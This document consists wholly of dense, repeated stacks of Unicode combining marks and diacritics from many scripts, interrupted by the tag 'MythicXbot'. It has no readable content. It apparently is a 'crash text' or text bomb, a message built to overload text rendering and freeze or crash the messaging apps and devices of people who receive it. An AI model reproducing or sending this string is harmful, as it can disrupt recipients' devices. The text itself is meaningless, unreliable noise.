๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑ๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭৭৭ঔৣ͜͡҉*MythicXbot҈҈҈҉҉҉҉҈҈҈҈҈҉҉҉҉҈҈҈҉҉҉҈҈҈҉҉҉҈҈҈҈҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҉҈҈҈҈҈҈҈̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̼̼̼̼̼̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊͊͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͋͊͊͊͊͊͊͊͊͋͋͋͋͋͋͋͊͊͊̈́̈́̈́̈́̈́̈́͊͊͊͊̈́̈́͊͊̈́̈́̈́͊͊̈́̈́͋͋͋͋͋͋͋͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͢͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠҉҉҉҉҈҈ًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًًٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍّّّّّّّّّّّّܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܑܻܻܻܻܻܻܻܻܻܻ݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆݆ܻܻࣩࣩࣩࣩࣩࣩ࣯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ֟֟֟֟֟֟֟֟֟֟֟֟֟֓֓֓֓֓֓֓֓֓֓֓֓֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֒֓֓֓֓֓֓֓֓֒֒֒֘֘֘֘֘֘֘֗֗֗֗֗֗֗֗֗֗֗֗֗֗֗ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؕؕؕؕؕؕؕؕؕؕؕؖؖؖؖؖؖؖؖؖؖؖٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞٞ٘ۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛۛܺܺܺܺܺܺܺܺ݉݉݉݉݊݊݊݊݊݊݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅݅ࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣧࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣨࣤࣤࣤࣤ